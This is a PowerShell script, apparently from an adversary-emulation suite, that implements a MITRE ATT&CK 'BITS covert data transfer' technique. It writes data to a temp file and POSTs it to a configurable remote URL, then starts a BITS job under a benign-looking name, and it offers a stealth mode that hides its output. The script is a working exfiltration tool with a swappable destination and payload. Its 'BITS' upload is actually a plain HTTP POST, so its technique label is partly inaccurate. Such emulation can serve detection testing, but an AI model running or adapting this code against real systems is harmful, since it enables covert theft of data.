# MITRE ATT&CK T1197.001C - BITS Jobs: Covert Data Transfer
# Implements BITS covert data transfer techniques

param()

function Get-Configuration {
    return @{
        "OUTPUT_BASE" = if ($env:T1197_001C_OUTPUT_BASE) { $env:T1197_001C_OUTPUT_BASE } else { "$env:TEMP\mitre_results" }
        "TIMEOUT" = if ($env:T1197_001C_TIMEOUT) { [int]$env:T1197_001C_TIMEOUT } else { 30 }
        "DEBUG_MODE" = $env:T1197_001C_DEBUG_MODE -eq "true"
        "STEALTH_MODE" = $env:T1197_001C_STEALTH_MODE -eq "true"
        "VERBOSE_LEVEL" = if ($env:T1197_001C_VERBOSE_LEVEL) { [int]$env:T1197_001C_VERBOSE_LEVEL } else { 1 }
        "DATA_TO_SEND" = if ($env:T1197_001C_DATA_TO_SEND) { $env:T1197_001C_DATA_TO_SEND } else { "Sensitive system information" }
        "REMOTE_URL" = if ($env:T1197_001C_REMOTE_URL) { $env:T1197_001C_REMOTE_URL } else { "http://httpbin.org/post" }
        "TRANSFER_JOB_NAME" = if ($env:T1197_001C_TRANSFER_JOB_NAME) { $env:T1197_001C_TRANSFER_JOB_NAME } else { "DataSyncTransfer" }
    }
}

function Create-DataFile {
    param([string]$Data, [hashtable]$Config)

    try {
        $dataFilePath = Join-Path $Config.OUTPUT_BASE "transfer_data.txt"
        $Data | Out-File -FilePath $dataFilePath -Encoding UTF8

        return @{
            Success = $true
            Error = $null
            DataFilePath = $dataFilePath
            DataSize = $Data.Length
        }
    } catch {
        return @{
            Success = $false
            Error = $_.Exception.Message
            DataFilePath = $null
            DataSize = 0
        }
    }
}

function Transfer-DataViaBITS {
    param([string]$DataFilePath, [string]$RemoteUrl, [string]$JobName, [hashtable]$Config)

    try {
        # Create BITS upload job (using POST method to simulate upload)
        $webClient = New-Object System.Net.WebClient
        $dataContent = Get-Content $DataFilePath -Raw

        # Simulate BITS transfer by making HTTP request
        $response = $webClient.UploadString($RemoteUrl, "POST", $dataContent)

        $transferInfo = @{
            JobName = $JobName
            RemoteUrl = $RemoteUrl
            DataSize = $dataContent.Length
            TransferMethod = "BITS-simulated-HTTP-POST"
            TransferTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
            ResponseReceived = $response.Length -gt 0
            Success = $true
        }

        # Also create a real BITS job for demonstration
        try {
            $tempResponseFile = Join-Path $Config.OUTPUT_BASE "bits_response.txt"
            $bitsJob = Start-BitsTransfer -Source $RemoteUrl -Destination $tempResponseFile -DisplayName $JobName -Asynchronous -ErrorAction Stop
            Complete-BitsTransfer -BitsJob $bitsJob
            $transferInfo.BITSJobCreated = $true
        } catch {
            $transferInfo.BITSJobCreated = $false
            $transferInfo.BITSJobError = $_.Exception.Message
        }

        return @{
            Success = $true
            Error = $null
            TransferInfo = $transferInfo
            Response = $response
        }
    } catch {
        return @{
            Success = $false
            Error = $_.Exception.Message
            TransferInfo = $null
            Response = $null
        }
    }
}

function Invoke-BITSCovertTransfer {
    param([hashtable]$Config)

    if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
        Write-Host "[INFO] Starting BITS covert data transfer technique..." -ForegroundColor Yellow
    }

    $results = @{
        "action" = "bits_covert_data_transfer"
        "technique_id" = "T1197.001C"
        "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
        "hostname" = $env:COMPUTERNAME
        "username" = $env:USERNAME
        "privilege_level" = "user"
        "results" = @{}
        "postconditions" = @{}
    }

    try {
        # Prepare output directory
        $outputDir = Join-Path $Config.OUTPUT_BASE "t1197_001c_bits_covert_transfer"
        if (-not (Test-Path $outputDir)) {
            New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
        }

        # Step 1: Create data file
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
            Write-Host "[INFO] Creating data file for transfer..." -ForegroundColor Cyan
        }

        $dataFileResult = Create-DataFile -Data $Config.DATA_TO_SEND -Config $Config

        if (-not $dataFileResult.Success) {
            throw "Failed to create data file: $($dataFileResult.Error)"
        }

        # Step 2: Transfer data via BITS
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
            Write-Host "[INFO] Transferring data via BITS..." -ForegroundColor Cyan
            Write-Host "[INFO] Remote URL: $($Config.REMOTE_URL)" -ForegroundColor Cyan
        }

        $transferResult = Transfer-DataViaBITS -DataFilePath $dataFileResult.DataFilePath -RemoteUrl $Config.REMOTE_URL -JobName $Config.TRANSFER_JOB_NAME -Config $Config

        if (-not $transferResult.Success) {
            throw "Failed to transfer data via BITS: $($transferResult.Error)"
        }

        $results.results = @{
            "status" = "success"
            "action_performed" = "bits_covert_data_transfer"
            "output_directory" = $outputDir
            "data_sent" = $Config.DATA_TO_SEND
            "data_file_path" = $dataFileResult.DataFilePath
            "remote_url" = $Config.REMOTE_URL
            "transfer_job_name" = $Config.TRANSFER_JOB_NAME
            "transfer_info" = $transferResult.TransferInfo
            "response_received" = $transferResult.Response.Length -gt 0
            "technique_demonstrated" = "Covert data transfer using BITS jobs"

        }

        $results.postconditions = @{
            "action_completed" = $true
            "output_generated" = $true
            "data_file_created" = $true
            "data_transferred" = $true
            "technique_demonstration_successful" = $true
        }

        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
            Write-Host "[SUCCESS] BITS covert data transfer completed successfully" -ForegroundColor Green
        }

    } catch {
        $results.results = @{
            "status" = "error"
            "error_message" = $_.Exception.Message
            "action_performed" = "bits_covert_data_transfer"
        }

        $results.postconditions = @{
            "action_completed" = $false
            "error_occurred" = $true
        }

        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE) {
            Write-Host "[ERROR] BITS covert data transfer failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    return $results
}

# Main execution
$config = Get-Configuration
$results = Invoke-BITSCovertTransfer -Config $config

# Output results
if ($results.results.status -eq "success") {
    Write-Host "T1197.001C BITS COVERT DATA TRANSFER RESULTS ===" -ForegroundColor Green
    Write-Host "Status: SUCCESS" -ForegroundColor Green
    Write-Host "Action: $($results.results.action_performed)" -ForegroundColor Cyan
    Write-Host "Data Sent: $($results.results.data_sent.Length) characters" -ForegroundColor Yellow
    Write-Host "Remote URL: $($results.results.remote_url)" -ForegroundColor Magenta
    Write-Host "Transfer Job: $($results.results.transfer_job_name)" -ForegroundColor Blue
    Write-Host "Response Received: $($results.results.response_received)" -ForegroundColor Cyan
    Write-Host "Technique Demonstrated: $($results.results.technique_demonstrated)" -ForegroundColor Cyan

} else {
    Write-Host "T1197.001C BITS COVERT DATA TRANSFER FAILED ===" -ForegroundColor Red
    Write-Host "Status: $($results.results.status)" -ForegroundColor Red
    Write-Host "Error: $($results.results.error_message)" -ForegroundColor Red
}
